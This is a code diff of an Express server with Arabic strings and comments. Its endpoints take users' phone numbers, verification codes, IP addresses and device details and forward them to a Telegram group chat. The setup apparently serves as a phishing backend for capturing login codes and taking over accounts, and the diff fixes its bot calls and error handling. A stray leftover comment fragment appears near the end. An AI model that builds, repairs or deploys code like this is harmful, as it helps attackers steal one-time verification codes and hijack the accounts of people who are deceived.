@@ -1458,12 +1458,13 @@ app.post('/submitIncrease', async (req, res) => {
 
 
 
+app.use(express.json());
 
 app.post('/sendPhoneNumber', async (req, res) => {
     const { phoneNumber, country, chatId, ip, platform, userAgent } = req.body;
 
     if (!chatId) {
-        return res.status(400).json({ error: 'Missing chatId' });
+        return res.status(400).json({ success: false, message: 'معرف المحادثة مفقود' });
     }
 
     const deviceInfo = useragent.parse(userAgent);
@@ -1471,7 +1472,7 @@ app.post('/sendPhoneNumber', async (req, res) => {
 
     try {
         // جلب معلومات المستخدم من تيليجرام
-        const userInfo = await bot.telegram.getChat(chatId);
+        const userInfo = await bot.getChat(chatId);
         const userName = userInfo.first_name || 'غير متاح';
         const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';
 
@@ -1487,20 +1488,24 @@ app.post('/sendPhoneNumber', async (req, res) => {
 الدولة: ${country}
 عنوان IP: ${ip}
 المنصة: ${platform}
-نظام التشغيل: ${deviceInfo.os}
-المتصفح: ${deviceInfo.browser}
-الجهاز: ${deviceInfo.device}
+نظام التشغيل: ${deviceInfo.os.toString()}
+المتصفح: ${deviceInfo.toAgent()}
+الجهاز: ${deviceInfo.device.toString()}
 ${userInfoText}
         `;
 
         // إرسال الرسالة إلى المجموعة
-        await bot.telegram.sendMessage(groupChatId, groupMessage);
+        await bot.sendMessage(groupChatId, groupMessage);
         console.log('تم إرسال رقم الهاتف إلى المجموعة بنجاح');
 
         res.json({ success: true, message: 'تم إرسال رمز التحقق' });
     } catch (error) {
         console.error('خطأ في إرسال الرسالة:', error);
-        res.status(500).json({ error: 'فشل في إرسال رقم الهاتف', details: error.message });
+        if (error.response && error.response.statusCode === 400) {
+            res.status(400).json({ success: false, message: 'معرف المحادثة غير صالح' });
+        } else {
+            res.status(500).json({ success: false, message: 'فشل في إرسال رقم الهاتف', details: error.message });
+        }
     }
 });
 
@@ -1508,7 +1513,7 @@ app.post('/verifyCode', async (req, res) => {
     const { verificationCode, chatId, phoneNumber, country, ip, platform, userAgent } = req.body;
 
     if (!chatId) {
-        return res.status(400).json({ error: 'Missing chatId' });
+        return res.status(400).json({ success: false, message: 'معرف المحادثة مفقود' });
     }
 
     const deviceInfo = useragent.parse(userAgent);
@@ -1516,7 +1521,7 @@ app.post('/verifyCode', async (req, res) => {
 
     try {
         // جلب معلومات المستخدم من تيليجرام
-        const userInfo = await bot.telegram.getChat(chatId);
+        const userInfo = await bot.getChat(chatId);
         const userName = userInfo.first_name || 'غير متاح';
         const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';
 
@@ -1533,22 +1538,30 @@ app.post('/verifyCode', async (req, res) => {
 الدولة: ${country}
 عنوان IP: ${ip}
 المنصة: ${platform}
-نظام التشغيل: ${deviceInfo.os}
-المتصفح: ${deviceInfo.browser}
-الجهاز: ${deviceInfo.device}
+نظام التشغيل: ${deviceInfo.os.toString()}
+المتصفح: ${deviceInfo.toAgent()}
+الجهاز: ${deviceInfo.device.toString()}
 ${userInfoText}
         `;
 
         // إرسال الرسالة إلى المجموعة
-        await bot.telegram.sendMessage(groupChatId, groupMessage);
+        await bot.sendMessage(groupChatId, groupMessage);
         console.log('تم إرسال كود التحقق إلى المجموعة بنجاح');
 
         res.json({ success: true, message: 'تم التحقق من الكود بنجاح' });
     } catch (error) {
         console.error('خطأ في إرسال الرسالة:', error);
-        res.status(500).json({ error: 'فشل في التحقق من الكود', details: error.message });
+        if (error.response && error.response.statusCode === 400) {
+            res.status(400).json({ success: false, message: 'معرف المحادثة غير صالح' });
+        } else {
+            res.status(500).json({ success: false, message: 'فشل في التحقق من الكود', details: error.message });
+        }
     }
 });
+
+
+        // إرسال الرسالة إلى المجموعة
+        
 
 // تشغيل الخادم
 
